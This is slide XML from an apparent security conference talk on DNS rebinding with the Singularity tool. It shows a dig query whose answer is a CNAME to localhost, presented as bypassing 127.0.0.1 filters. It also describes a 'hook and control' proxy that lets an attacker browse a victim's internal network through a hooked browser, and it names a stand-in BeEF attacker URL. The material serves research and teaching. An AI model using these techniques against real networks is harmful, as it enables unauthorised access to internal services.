              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bypasses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> protections that block DNS responses of 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dig s-1.2.3.4-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>-123-fs-e.d.rebind.it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; QUESTION SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;s-1.2.3.4-localhost-123-fs-e.d.rebind.it. IN    	A</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>;; ANSWER SECTION:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>s-1.2.3.4-localhost-123-fs-e.d.rebind.it. 0 IN </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CNAME localhost.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="17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62" name="Shape 462"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463" name="Google Shape;463;p6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Hook</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> : interactively browse the victim's internal network after DNS rebinding</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67" name="Shape 467"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;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Experimenting with Proxying without an HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469" name="Google Shape;469;p6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 tools such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>BeEF (Browser Exploitation Framework - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://beefproject.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>) and FireDrill (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.usenix.org/conference/woot13/workshop-program/presentation/dai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>) can use a hooked browser via XSS or DNS rebinding as a gateway to otherwise unreachable networks such as home or corporate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>environments</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We know that BeEF requires to configure the attacker browser or operating system to use the BeEF HTTP proxy e.g. “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://beef.attaker.com:3120/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>”. We do not know how FireDrill does it since its code is unfortunately not available.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We implemented </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>browsing of services via a hooked browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>in Singularity, without requiring the attacker setting up its browser to use an HTTP proxy for fun.</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73" name="Shape 473"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="474" name="Google Shape;474;p6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Proxy Architecture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475" name="Google Shape;475;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1387661"/>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Attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="476" name="Google Shape;476;p65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3637125" y="2500225"/>
            <a:ext cx="49638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Websocket: connect and wait for instructions</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="477" name="Google Shape;477;p65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="3544350" y="2499025"/>
            <a:ext cx="2180400" cy="1200"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="triangle"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2478900" y="1377975"/>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Singularity</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="479" name="Google Shape;479;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4722300" y="1377975"/>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Hooked </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Target Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="480" name="Google Shape;480;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6893700" y="1377975"/>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Target Service</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="481" name="Google Shape;481;p65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="1276350" y="3503700"/>
            <a:ext cx="2141700" cy="150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482" name="Google Shape;482;p65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1179675" y="3481300"/>
            <a:ext cx="44211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HTTP: connect </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>and select hooked target browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="483" name="Google Shape;483;p65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2344252" y="1113725"/>
            <a:ext cx="30600" cy="3555300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="484" name="Google Shape;484;p65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4562280" y="1106363"/>
            <a:ext cx="14400" cy="3514200"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="485" name="Google Shape;485;p65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6790252" y="1113725"/>
            <a:ext cx="4200" cy="3555300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="non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89" name="Shape 489"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="490" name="Google Shape;490;p6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Proxy Architecture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="491" name="Google Shape;491;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1387661"/>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Attacker Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="492" name="Google Shape;492;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2478900" y="1377975"/>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Singularity</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4722300" y="1377975"/>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Hooked </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Target Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="494" name="Google Shape;494;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6893700" y="1377975"/>
            <a:ext cx="1938600" cy="914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Target Service</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="495" name="Google Shape;495;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="1314450" y="2513100"/>
            <a:ext cx="2141700" cy="150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496" name="Google Shape;496;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1217775" y="2490700"/>
            <a:ext cx="24861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GET /home HTTP/1.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="497" name="Google Shape;497;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="3495675" y="3189375"/>
            <a:ext cx="2141700" cy="150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498" name="Google Shape;498;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3399075" y="3176500"/>
            <a:ext cx="44211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Websocket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: op=”fetch”,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> args “/home”</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="499" name="Google Shape;499;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="5905500" y="3903750"/>
            <a:ext cx="2141700" cy="1500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="500" name="Google Shape;500;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5837400" y="3919450"/>
            <a:ext cx="34305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HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: fetch(“home”,{...})</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="501" name="Google Shape;501;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1418400" y="4611725"/>
            <a:ext cx="6628800" cy="4500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="triangle"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="Google Shape;502;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4151550" y="4586200"/>
            <a:ext cx="44211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...and back</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="503" name="Google Shape;503;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3828450" y="2582763"/>
            <a:ext cx="600" cy="500400"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="triangle"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="504" name="Google Shape;504;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3816000" y="2557863"/>
            <a:ext cx="11349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chemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>translate</a:t>
            </a:r>
            <a:endParaRPr i="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="505" name="Google Shape;505;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6162075" y="3252063"/>
            <a:ext cx="600" cy="500400"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="triangle"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="506" name="Google Shape;506;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149625" y="3227163"/>
            <a:ext cx="11349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chemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>translate</a:t>
            </a:r>
            <a:endParaRPr i="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="507" name="Google Shape;507;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2353852" y="1113725"/>
            <a:ext cx="21000" cy="3855300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="508" name="Google Shape;508;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4562280" y="1106363"/>
            <a:ext cx="14400" cy="3514200"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="509" name="Google Shape;509;p66"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6794452" y="1113725"/>
            <a:ext cx="5400" cy="3826200"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="dot"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="non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13" name="Shape 513"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
